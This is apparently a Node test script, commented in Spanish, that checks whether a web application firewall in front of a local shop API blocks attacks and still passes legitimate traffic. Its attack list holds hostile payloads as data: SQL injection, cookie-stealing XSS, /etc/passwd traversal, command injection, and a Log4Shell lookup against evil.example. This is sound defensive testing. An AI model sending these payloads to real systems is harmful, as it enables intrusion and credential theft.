// Verifica el WAF: los ataques deben ser bloqueados por el WAF y el tráfico legítimo debe llegar a la aplicación.
//   node scripts/waf-check.mjs [urlBase]      (por defecto http://localhost:8080, es decir, el WAF)
// Usa el nombre "localhost" (no una IP) para no activar la regla CRS 920350 (Host numérico).

import { BASE, Client, Report } from './lib/client.mjs'

const report = new Report()
const JSON_HEADERS = { 'Content-Type': 'application/json', Accept: 'application/json' }
const send = (path, init = {}) => fetch(BASE + path, { redirect: 'manual', ...init })
const post = (path, body) => send(path, { method: 'POST', headers: JSON_HEADERS, body: JSON.stringify(body) })

// La API siempre responde JSON; el WAF responde con su propia página HTML. Así se sabe quién bloqueó.
const blockedByWaf = async (res) => (res.status === 403 || res.status === 405) && !(res.headers.get('content-type') ?? '').includes('application/json')

console.log(`\nVerificación del WAF en ${BASE}\n`)

const attacks = [
  ['SQLi clásico en la query', () => send("/api/products?q=' OR '1'='1' --")],
  ['SQLi con UNION SELECT', () => send('/api/products?id=1 UNION SELECT username,password FROM users--')],
  ['XSS reflejado en la query', () => send('/api/products?q=<script>alert(document.cookie)</script>')],
  ['Recorrido de directorios (LFI)', () => send('/api/products?file=../../../../etc/passwd')],
  ['Inyección de comandos', () => send('/api/products?cmd=;cat%20/etc/passwd')],
  ['Log4Shell en una cabecera', () => send('/api/products', { headers: { 'X-Api-Version': '${jndi:ldap://evil.example/a}' } })],
  ['Escáner conocido (User-Agent)', () => send('/api/products', { headers: { 'User-Agent': 'sqlmap/1.7.2#stable (https://sqlmap.org)' } })],
  ['SQLi dentro del JSON de login', () => post('/api/auth/login', { email: "' OR 1=1 --", password: 'cualquiera' })],
  ['XSS dentro del JSON de registro', () => post('/api/auth/register', { email: 'a@example.com', name: '<script>alert(1)</script>', password: 'clave-larga-123' })],
  ['Método HTTP no permitido (PROPFIND)', () => send('/api/products', { method: 'PROPFIND' })],
]
for (const [label, run] of attacks) {
  const res = await run()
  report.check(`el WAF bloquea: ${label}`, await blockedByWaf(res), `(estado ${res.status}, ${res.headers.get('content-type')})`)
}

// Tráfico legítimo: con sesión y token CSRF, la petición debe llegar a la API y recibir SU respuesta.
const c = new Client()
const legit = [
  ['catálogo público', () => c.call('GET', '/api/products'), 200],
  ['detalle de producto', () => c.call('GET', '/api/products/1'), 200],
  ['contraseña con símbolos (comillas, <, >, ;, --)', () => c.call('POST', '/api/auth/login', { email: 'nadie@example.com', password: `Zq7'--;<x>/*k9"` }), 401],
  ['contraseña que parece una inyección SQL', () => c.call('POST', '/api/auth/login', { email: 'nadie@example.com', password: "' OR '1'='1' --" }), 401],
  ['correo válido con apóstrofo', () => c.call('POST', '/api/auth/login', { email: "o'brien@example.com", password: 'clave-larga-123' }), 401],
  ['método PUT (lo usa la API)', () => c.call('PUT', '/api/cart/items/1', { quantity: 1 }), 401],
  ['método PATCH (lo usa el panel admin)', () => c.call('PATCH', '/api/admin/products/1', { name: 'Prueba' }), 401],
  ['método DELETE (lo usa la API)', () => c.call('DELETE', '/api/cart'), 401],
]
for (const [label, run, expected] of legit) {
  const res = await run().catch((e) => ({ status: 0, body: String(e) }))
  report.check(`la API recibe: ${label}`, res.status === expected, `(esperado ${expected}, recibió ${res.status})`)
}

report.finish()
